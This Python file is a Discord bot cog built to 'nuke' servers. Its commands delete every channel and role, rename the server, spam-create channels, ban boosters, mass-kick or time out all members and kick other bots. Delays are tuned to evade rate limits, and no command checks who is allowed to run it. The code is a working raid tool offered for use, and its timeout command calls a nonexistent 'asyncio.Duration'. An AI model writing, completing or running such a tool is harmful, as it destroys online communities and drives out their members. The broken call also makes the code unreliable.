import discord
from discord.ext import commands
import asyncio

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def nuke(self, ctx):
        if not ctx.guild: return
        
        try:
            await ctx.guild.edit(name="NUKED", icon=None)
        except:
            print("Failed to change server name/icon (Missing Permissions)")
        
        for channel in ctx.guild.channels:
            try: 
                await channel.delete()
                await asyncio.sleep(0.3)
            except: continue
        
        for i in range(100):
            try:
                await ctx.guild.create_text_channel("nuked")
                await asyncio.sleep(0.8) # increased to avoid 429; ratelimits
            except: break
        
        for role in ctx.guild.roles:
            if role.name != "@everyone" and not role.managed:
                try: 
                    await role.delete()
                    await asyncio.sleep(0.3)
                except: continue


    @commands.command()
    async def wizz(self, ctx, vanity: str = None):
        if not ctx.guild: return
        await asyncio.sleep(5)

        try: await ctx.guild.edit(vanity_code=None)
        except: print("Failed to drop vanity (Missing Permissions)")

        for member in ctx.guild.members:
            if member.premium_since:
                try:
                    await member.ban(reason="wizzed")
                    await asyncio.sleep(0.5)
                except: continue

        while True:
            members_to_kick = [m for m in ctx.guild.members if m != ctx.guild.me and not m.bot]
            if not members_to_kick:
                break
            batch = members_to_kick[:100]
            for member in batch:
                try:
                    await member.kick(reason="wizzed")
                    await asyncio.sleep(0.5)
                except: continue
            if len(batch) < 100:
                break

    @commands.command()
    async def softwizz(self, ctx):
        if not ctx.guild: return
        
        for member in ctx.guild.members:
            if member != ctx.guild.me and not member.bot:
                try:
                    await member.timeout(duration=asyncio.Duration(days=7))
                    if member.voice:
                        await member.edit(mute=True, deafen=True)
                    await asyncio.sleep(0.5)
                except: continue

    @commands.command()
    async def vcclap(self, ctx):
        if not ctx.guild or not ctx.author.voice: return
        
        main_vc = ctx.author.voice.channel
        for vc in ctx.guild.voice_channels:
            if vc != main_vc:
                for member in vc.members:
                    try: 
                        await member.move_to(main_vc)
                        await asyncio.sleep(0.3)
                    except: continue
                try: 
                    await vc.delete()
                    await asyncio.sleep(0.5)
                except: continue

    @commands.command()
    async def kickbots(self, ctx):
        if not ctx.guild: return
        
        count = 0
        for member in ctx.guild.members:
            if member.bot and member != self.bot.user:
                try:
                    await member.kick(reason="fuck bots")
                    count += 1
                    await asyncio.sleep(0.5)
                except: continue
        print(f"Kicked {count} bots.")

async def setup(bot):
    await bot.add_cog(Nuke(bot))
